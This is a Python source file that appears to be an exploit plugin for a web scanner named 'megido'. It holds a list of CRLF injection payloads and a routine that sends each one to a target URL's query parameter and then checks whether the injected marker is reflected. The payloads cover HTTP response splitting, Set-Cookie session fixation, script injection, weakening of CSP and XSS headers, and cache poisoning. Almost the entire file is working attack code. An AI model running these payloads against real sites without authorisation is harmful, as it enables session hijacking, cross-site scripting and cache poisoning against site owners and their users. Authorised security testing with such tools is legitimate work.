"""
CRLF Injection Exploit Plugin

Provides exploit capabilities for CRLF Injection vulnerabilities:
- HTTP response splitting
- Header injection via CRLF
- Session fixation via Set-Cookie injection
- XSS via response splitting
"""

import sys
import os
from typing import Dict, List, Any, Optional
from urllib.parse import quote
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_CRLF_PAYLOADS = [
    '%0d%0aSet-Cookie:megido_crlf=1',
    '%0aSet-Cookie:megido_crlf=1',
    '%0d%0aLocation:https://megido.example.com',
    '%0d%0aContent-Length:0%0d%0a%0d%0a<script>alert(1)</script>',
    '\r\nSet-Cookie:megido_crlf=1',
    '\nSet-Cookie:megido_crlf=1',
    '%E5%98%8D%E5%98%8ASet-Cookie:megido_crlf=1',  # Unicode CRLF
    # Response splitting payloads
    '%0d%0a%0d%0a<html><script>alert(1)</script>',
    '%0d%0aX-Injected-Header:megido_test',
    '%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>',
    # Double encoding
    '%250d%250aSet-Cookie:megido_crlf=1',
    '%25%30%64%25%30%61Set-Cookie:megido_crlf=1',
    # Unicode variants
    '\u000d\u000aSet-Cookie:megido_crlf=1',
    '\r\nX-Forwarded-For:127.0.0.1\r\nX-Admin:true',
    # Cache poisoning via CRLF
    '%0d%0aCache-Control:no-cache%0d%0aX-Cache-Poison:1',
    '%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0%0d%0a%0d%0a',
    # Header injection for XSS
    '%0d%0aContent-Security-Policy:default-src%20*',
    '%0d%0aX-XSS-Protection:0',
    # Set-Cookie injection variants
    '%0d%0aSet-Cookie:admin=true;Path=/',
    '%0d%0aSet-Cookie:sessionid=megidohijacked;HttpOnly=false',
    '%0d%0aSet-Cookie:megido_crlf=1;domain=.example.com',
    # Newline only variants
    '%0aX-Injected:megido_test',
    '%0aContent-Type:text/html',
    # Mixed encoding
    '%0D%0ASet-Cookie:megido_crlf=1',
    '%0D%0aSet-Cookie:megido_crlf=1',
    '%0d%0ASet-Cookie:megido_crlf=1',
]


class CRLFPlugin(ExploitPlugin):
    """CRLF Injection exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'crlf'

    @property
    def name(self) -> str:
        return 'CRLF Injection Exploit'

    @property
    def description(self) -> str:
        return 'CRLF Injection exploit: HTTP response splitting, header injection, cookie injection.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return CRLF injection payloads."""
        return list(_CRLF_PAYLOADS)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Test CRLF injection by injecting payloads and checking response headers."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'crlf',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        parameter = vulnerability_data.get('parameter', 'url')

        for payload in _CRLF_PAYLOADS:
            try:
                if '?' in target_url:
                    test_url = f"{target_url}&{parameter}={payload}"
                else:
                    test_url = f"{target_url}?{parameter}={payload}"

                resp = requests.get(test_url, timeout=timeout, verify=verify_ssl,
                                    allow_redirects=False)

                # Check if injected header appears in response
                if 'megido_crlf' in str(resp.headers) or 'megido_crlf' in resp.text:
                    return {
                        'success': True,
                        'vulnerability_type': 'crlf',
                        'payload': payload,
                        'evidence': f'Injected header reflected in response headers or body',
                        'response_headers': dict(resp.headers),
                        'message': 'CRLF injection confirmed â€” header injection successful',
                    }
            except Exception as e:
                logger.debug(f"CRLF test error (payload={payload!r}): {e}")

        return {
            'success': False,
            'error': 'No CRLF injection vulnerability confirmed',
            'vulnerability_type': 'crlf',
        }
